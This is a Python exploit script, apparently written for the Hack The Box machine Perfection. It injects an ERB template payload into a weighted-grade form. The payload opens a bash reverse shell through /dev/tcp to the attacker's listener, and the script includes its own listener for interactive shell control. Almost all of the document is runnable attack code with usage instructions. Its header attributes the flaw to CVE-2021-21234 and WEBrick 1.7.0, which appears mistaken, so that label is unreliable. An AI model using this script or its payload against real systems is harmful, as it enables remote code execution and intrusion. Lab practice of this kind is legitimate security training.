# PoC of CVE-2021-21234
# By artp3r

# Usage: python3 poc_webrick170.py --target <ip> --url <url> --listen <local_ip> --port <local_port>
# Extract your specific payload from your request.
# Requires TTY setting after exploitation.

# Sucesfully tested in HTB Machine: Perfection.
# Usage: python3 poc_webrick170.py --target 10.10.11.253 --url http://10.10.11.253/weighted-grade-calc --listen <local_ip> --port 4444

import socket
import threading
import requests
import argparse

def listener(listener_ip, listener_port):
    """Listens for incoming connections on the specified port."""
    try:
        # Create socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((listener_ip, listener_port))
        server_socket.listen(1)  # Listen for a single connection

        print(f"[+] Listening on {listener_ip}:{listener_port}...")

        # Wait for an incoming connection
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection received from {client_address[0]}:{client_address[1]}")

        # Keep the connection open for interaction
        while True:
            # Receive data
            data = client_socket.recv(1024)
            if not data:
                print("[-] Connection closed by the client.")
                break

            print(data.decode(errors="ignore"), end="")

            # Send commands (basic interaction with the reverse shell)
            cmd = input("$ ")
            if cmd.strip().lower() == "exit":
                print("[+] Closing connection.")
                client_socket.close()
                break
            client_socket.sendall(cmd.encode() + b"\n")

    except KeyboardInterrupt:
        print("\n[-] Interrupted by the user. Exiting...")
    except Exception as e:
        print(f"[-] Listener error: {e}")
    finally:
        server_socket.close()
        print("[+] Listener closed.")

def exploit_webrick(target_url, target_ip, listener_ip, listener_port):
    """Sends the payload to the vulnerable server."""
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{target_ip}",
        "Connection": "keep-alive",
        "Referer": target_url,
        "Upgrade-Insecure-Requests": "1",
    }

    payload = (
        f"category1=aaa%0A<%25%3d+IO.popen("
        f"\"bash+-c+'bash+-i+>%26+/dev/tcp/{listener_ip}/{listener_port}+0>%261'\""
        f").readlines()+%25>&grade1=10&weight1=5&"
        f"category2=bbb&grade2=20&weight2=10&"
        f"category3=ccc&grade3=30&weight3=20&"
        f"category4=ddd&grade4=40&weight4=30&"
        f"category5=eee&grade5=50&weight5=35"
    )

    try:
        print(f"[+] Sending payload to target {target_url}...")
        response = requests.post(target_url, headers=headers, data=payload, allow_redirects=False)
        print(f"[+] Payload sent. Response code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error sending the payload: {e}")

def parse_arguments():
    """Parses command-line arguments."""
    parser = argparse.ArgumentParser(description="SSTI exploit for WEBrick 1.7.0 with integrated listener.")
    parser.add_argument("--target", required=True, help="IP of the vulnerable target.")
    parser.add_argument("--url", required=True, help="Full URL of the vulnerable endpoint.")
    parser.add_argument("--listen", required=True, help="IP where the listener will be running.")
    parser.add_argument("--port", required=True, type=int, help="Port where the listener will be running.")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()

    # Create a thread for the listener
    listener_thread = threading.Thread(
        target=listener, args=(args.listen, args.port), daemon=True
    )
    listener_thread.start()

    # Execute the exploit
    exploit_webrick(args.url, args.target, args.listen, args.port)

    # Keep the script running until the listener closes
    try:
        while listener_thread.is_alive():
            listener_thread.join(1)
    except KeyboardInterrupt:
        print("\n[-] Interrupted by the user. Exiting...")
